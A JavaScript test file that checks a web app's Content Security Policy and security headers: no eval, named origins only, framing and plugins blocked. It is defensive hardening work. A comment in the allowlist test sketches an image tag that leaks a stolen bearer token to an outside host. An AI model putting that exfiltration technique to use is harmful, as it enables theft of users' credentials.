import assert from 'node:assert/strict';
import { test } from 'node:test';
import { buildCsp, staticSecurityHeaders } from './security-headers.ts';

// The runner is not a production build, so ask for the production policy explicitly.
const prod = buildCsp(undefined, { dev: false });
const directive = (name) => prod.split('; ').find((d) => d.startsWith(`${name} `)) ?? '';

test('production script-src does not allow eval', () => {
  // 'unsafe-eval' turns any injected string into code execution. Only the
  // dev runtime needs it, and this module is read at build time so the
  // production bundle genuinely omits it.
  assert.doesNotMatch(directive('script-src'), /unsafe-eval/);
  assert.match(directive('script-src'), /'self'/);
});

test('a nonce or strict-dynamic is never used, because the pages are prerendered', () => {
  // Measured: /login and the dashboard are prerendered at build time, so
  // their script tags carry no per-request nonce. 'strict-dynamic' then makes
  // the browser ignore 'self' and block every chunk, which took the app down.
  assert.doesNotMatch(prod, /nonce-/);
  assert.doesNotMatch(prod, /strict-dynamic/);
});

test('the image and connection allowlists name origins instead of any https host', () => {
  // A wildcard here is the exfiltration channel for a stolen bearer token:
  // <img src="https://elsewhere/?t=..."> would happily send it.
  for (const name of ['img-src', 'connect-src', 'frame-src']) {
    const value = directive(name);
    assert.doesNotMatch(value, /(?:^|\s)https:(?:\s|$)/, `${name} must not allow any https origin`);
    assert.doesNotMatch(value, /(?:^|\s)wss:(?:\s|$)/, `${name} must not allow any wss origin`);
    assert.doesNotMatch(value, /\*/, `${name} must not contain a wildcard`);
  }
});

test('the API and bridge origins are allowed, in both http and ws form', () => {
  const connect = directive('connect-src');
  assert.match(connect, /localhost:8000/, 'the API origin must be reachable');
  assert.match(connect, /ws:\/\/localhost:3001/, 'the socket bridge must be reachable');
});

test('the framing, plugin and base directives are closed off', () => {
  assert.equal(directive('frame-ancestors'), "frame-ancestors 'none'");
  assert.equal(directive('object-src'), "object-src 'none'");
  assert.match(directive('base-uri'), /'self'/);
  assert.match(directive('form-action'), /'self'/);
  assert.equal(directive('default-src'), "default-src 'self'");
  assert.match(prod, /upgrade-insecure-requests/, 'production must not allow plain http');
});

test('the response headers cover the basics a token in the browser needs', () => {
  const headers = Object.fromEntries(staticSecurityHeaders.map((h) => [h.key, h.value]));

  assert.equal(headers['X-Frame-Options'], 'DENY');
  assert.equal(headers['X-Content-Type-Options'], 'nosniff');
  assert.equal(headers['Cross-Origin-Opener-Policy'], 'same-origin');
  assert.equal(headers['Cross-Origin-Resource-Policy'], 'same-origin');
  assert.match(headers['Referrer-Policy'], /strict-origin/);
  assert.match(headers['Permissions-Policy'], /microphone=\(\)/);
  assert.match(headers['Permissions-Policy'], /geolocation=\(\)/);
  assert.match(headers['Permissions-Policy'], /payment=\(\)/);
});
